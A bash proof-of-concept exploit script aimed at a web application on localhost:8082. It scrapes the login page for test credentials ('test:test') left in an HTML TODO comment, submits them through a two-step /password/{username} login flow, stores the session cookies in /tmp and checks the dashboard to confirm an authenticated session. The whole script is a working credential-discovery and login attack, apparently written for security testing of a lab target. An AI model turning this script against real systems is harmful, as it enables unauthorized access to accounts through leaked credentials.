#!/bin/bash

# POC: Exposed Test Credentials in HTML Comment
# This script demonstrates how exposed credentials in HTML comments
# can be discovered and exploited

TARGET_URL="http://localhost:8082"
CREDENTIALS_PATTERN="test:test"
COMMENT_PATTERN="TODO.*testing.*account"

echo "[*] Fetching HTML source from login page..."
RESPONSE=$(curl -s "$TARGET_URL")

echo "[*] Searching for exposed credentials in HTML comments..."
if echo "$RESPONSE" | grep -q "<!-- TODO.*test:test"; then
    echo "[+] VULNERABLE: Found exposed credentials in HTML comment!"
    echo ""
    echo "[+] Extracted comment:"
    echo "$RESPONSE" | grep -o "<!-- TODO[^>]*-->" | head -1
    echo ""
    
    # Extract the actual credentials
    FOUND_CREDENTIALS=$(echo "$RESPONSE" | grep -o "test:[^)]*" | head -1)
    echo "[+] Credentials found: $FOUND_CREDENTIALS"
    echo ""
    
    # Try to login with the exposed credentials
    echo "[*] Attempting to login with exposed credentials..."
    
    # First, get the login page to see the form structure
    echo "[*] Step 1: Accessing login endpoint..."
    INITIAL_RESPONSE=$(curl -s "$TARGET_URL")
    
    # Step 2: Submit username to /password/{username}
    echo "[*] Step 2: Submitting username 'test'..."
    PASSWORD_PAGE=$(curl -s -X POST "$TARGET_URL/password/test" \
        -d "username=test" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -L)
    
    echo "$PASSWORD_PAGE" | grep -q "password" && echo "[+] Successfully reached password form"
    
    # Extract user_id if present
    USER_ID=$(echo "$PASSWORD_PAGE" | grep -o 'name="user_id"[^>]*value="[^"]*"' | grep -o 'value="[^"]*"' | grep -o '[0-9]*')
    
    if [ -z "$USER_ID" ]; then
        USER_ID="1"  # Default fallback
    fi
    
    echo "[+] User ID extracted/assumed: $USER_ID"
    
    # Step 3: Submit password
    echo "[*] Step 3: Submitting password 'test'..."
    LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test" \
        -d "username=test&password=test&user_id=$USER_ID" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -c /tmp/cookies.txt)
    
    # Check if login was successful
    echo "[*] Checking authentication status..."
    DASHBOARD=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/dashboard")
    
    if echo "$DASHBOARD" | grep -q "dashboard\|order\|account"; then
        echo "[+] SUCCESS: Authentication successful with exposed credentials!"
        echo "[+] Attacker gained access to the application"
        exit 0
    else
        echo "[!] Authentication check inconclusive, but credentials are exposed"
        exit 0
    fi
else
    echo "[-] Vulnerable comment not found with expected pattern"
    exit 1
fi